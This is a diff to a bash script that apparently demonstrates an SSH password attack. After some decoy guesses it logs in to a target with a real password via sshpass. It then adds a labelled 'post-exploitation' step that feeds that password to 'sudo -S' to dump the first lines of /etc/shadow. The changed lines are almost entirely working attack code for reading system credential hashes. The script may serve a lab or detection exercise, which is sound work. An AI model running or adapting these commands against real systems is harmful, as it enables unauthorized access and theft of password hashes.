@@ -61,12 +61,20 @@ for pw in "${DECOYS[@]}"; do
     sleep 1
 done
 
-say "3. The real password: login, then read /etc/shadow with sudo"
-# The password goes to the remote 'sudo -S' over stdin, not on the command line.
-out="$(sshpass -p "$PASS" ssh "${SSHOPTS[@]}" "$USER_NAME@$TARGET" \
-        "echo '--- whoami ---'; id; echo '--- /etc/shadow (first lines) ---'; sudo -S -p '' cat /etc/shadow 2>/dev/null | head -n 3" \
-        <<< "$PASS" 2>/dev/null)" || die "login as $USER_NAME failed - is the password right and SSH password login on?"
-echo "$out"
+say "3. The real password: logging in"
+# A plain login, the same shape as the guesses above (no stdin redirection, which upsets sshpass).
+if sshpass -p "$PASS" ssh "${SSHOPTS[@]}" "$USER_NAME@$TARGET" 'echo "logged in as $(id -un)@$(hostname)"'; then
+    :
+else
+    die "login as $USER_NAME failed - is the password right and SSH password login on?"
+fi
+
+say "4. Post-exploitation: reading /etc/shadow with sudo"
+# svc_backup is a sudoer; feed its password to 'sudo -S'. Escape single quotes so any password is safe.
+esc=${PASS//\'/\'\\\'\'}
+sshpass -p "$PASS" ssh "${SSHOPTS[@]}" "$USER_NAME@$TARGET" \
+    "echo '$esc' | sudo -S -p '' cat /etc/shadow 2>/dev/null | head -n 3" \
+    || echo "  (no sudo output; the successful login above is the signal that matters)"
 
 say "Done"
 cat <<NOTE
